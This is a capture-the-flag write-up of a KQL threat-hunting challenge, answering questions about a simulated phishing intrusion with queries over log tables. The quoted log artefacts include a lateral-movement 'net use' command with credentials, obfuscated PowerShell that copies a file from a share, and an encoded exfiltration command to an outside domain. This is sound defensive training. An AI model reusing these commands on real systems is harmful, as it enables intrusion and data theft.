# Objective 13: KQL Kraken Hunt
**Location: Film Noir Island: Gumshoe Alley PI Office**

**Hints provided by Tangle Coalbox**

The aim of this objective is to get familiar with the Kusto platform and the KQL language, which is in total similar to Splunk.

### Onboarding:  
How many Craftperson Elf’s are working from laptops?

`Employees | where role=="Craftsperson Elf" | where hostname contains "LAPTOP"`

**25**

### Case 1:  
What is the email address of the employee who received this phishing email?

`OutboundNetworkEvents | where url=="http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx" | join (Employees) on $left.src_ip==$right.ip_addr | project email_addr`

**alabaster_snowball@santaworkshopgeeseislands.org**

What is the email address that was used to send this spear phishing email?

`Email | where recipient=="alabaster_snowball@santaworkshopgeeseislands.org" | where link=="http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx" | project sender`

**cwombley@gmail.com**

  What was the subject line used in the spear phishing email?

`Email | where recipient=="alabaster_snowball@santaworkshopgeeseislands.org" | where link=="http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx" | project subject`

**[EXTERNAL] Invoice foir reindeer food past due**

 ### Case 2:

What is the role of our victim in the organization?

`Employees | where email_addr =="alabaster_snowball@santaworkshopgeeseislands.org" | project role`

**Head Elf**

 What is the hostname of the victim's machine?

`Employees | where email_addr =="alabaster_snowball@santaworkshopgeeseislands.org" | project hostname`

**Y1US-DESKTOP**

 What is the source IP linked to the victim?

`Employees | where email_addr =="alabaster_snowball@santaworkshopgeeseislands.org" | project ip_addr`

**10.10.0.4**

  ### Case 3:

What time did Alabaster click on the malicious link? Make sure to copy the exact timestamp from the logs!

`OutboundNetworkEvents | where url=="http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx" | project timestamp`

**2023-12-02T10:12:42Z**

  What file is dropped to Alabaster's machine shortly after he downloads the malicious file?

`Employees | where email_addr =="alabaster_snowball@santaworkshopgeeseislands.org" | project hostname | join FileCreationEvents on $left.hostname==$right.hostname | where timestamp>=datetime("2023-12-02T10:12:42Z") | project filename`

**giftwrap.exe**

### Case 4:  
The attacker created an reverse tunnel connection with the compromised machine. What IP was the connection forwarded to?

`Employees | where email_addr =="alabaster_snowball@santaworkshopgeeseislands.org" | project hostname | join ProcessEvents on $left.hostname==$right.hostname | where timestamp>=datetime("2023-12-02T10:12:42Z") | project process_commandline`

**113.37.9.17**

  What is the timestamp when the attackers enumerated network shares on the machine?

`Employees | where email_addr =="alabaster_snowball@santaworkshopgeeseislands.org" | project hostname | join ProcessEvents on $left.hostname==$right.hostname | where timestamp>=datetime("2023-12-02T10:12:42Z") | project timestamp,process_commandline`

**2023-12-02T16:51:44Z** → `net share` command

  What was the hostname of the system the attacker moved laterally to?

**NorthPolefileshare**  → `"process_commandline": cmd.exe /C net use \\NorthPolefileshare\c$ /user:admin AdminPass123)` command

### Case 5:

When was the attacker's first base64 encoded PowerShell command executed on Alabaster's machine?

`Employees | where email_addr =="alabaster_snowball@santaworkshopgeeseislands.org" | project hostname | join ProcessEvents on $left.hostname==$right.hostname | where timestamp>=datetime("2023-12-02T10:12:42Z") | where process_commandline contains "PowerShell" | project timestamp,process_commandline`

**2023-12-24T16:07:47Z**

 What was the name of the file the attacker copied from the fileshare? (This might require some additional decoding)

The command executed at the above timestamp is:

`( 'txt.tsiLeciNythguaN\potkseD\:C txt.tsiLeciNythguaN\lacitirCnoissiM\$c\erahselifeloPhtroN\\ metI-ypoC c- exe.llehsrewop' -split '' | %{$_[0]}) -join ''`

The filename has to be reversed using `echo txt.tsiLeciNythguaN | rev`

**NaughtyNiceList.txt**

 The attacker has likely exfiltrated data from the file share. What domain name was the data exfiltrated to?

The activity was performed at 2023-12-24T16:58:43Z.
Base64 decoding leads to:  
`[StRiNg]::JoIn( '', [ChaR[]](100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101))|& ((gv '*Mdr*').NamE[3,11,2]-joiN`

This is the decimal representation of the ASCII string `downwithsanta.exe -exfil C:\\Desktop\\NaughtNiceList.docx \\giftbox.com\file`

**giftbox.com**
  
### Case 6:

What is the name of the executable the attackers used in the final malicious command?

`Employees | where email_addr =="alabaster_snowball@santaworkshopgeeseislands.org" | project hostname | join ProcessEvents on $left.hostname==$right.hostname | where timestamp>=datetime("2023-12-02T10:12:42Z") | where process_commandline contains "PowerShell" | project timestamp,process_commandline`

The activity can be found at 2023-12-25T10:44:27Z.

**downwithsanta.exe**

What was the command line flag used alongside this executable?

**--wipeall**

### Well done!

We are provided with the below command to be executed in the KQL prompt:

`print base64_decode_tostring('QmV3YXJlIHRoZSBDdWJlIHRoYXQgV29tYmxlcw==')`

**Beware the Cube that Wombles**

**Achievement: KQL Kraken Hunt**
<!--stackedit_data:
eyJoaXN0b3J5IjpbMTU4MDA3MDAyNCwtNDUxNTcyOTY2LC0yMD
EwMTkyNjNdfQ==
-->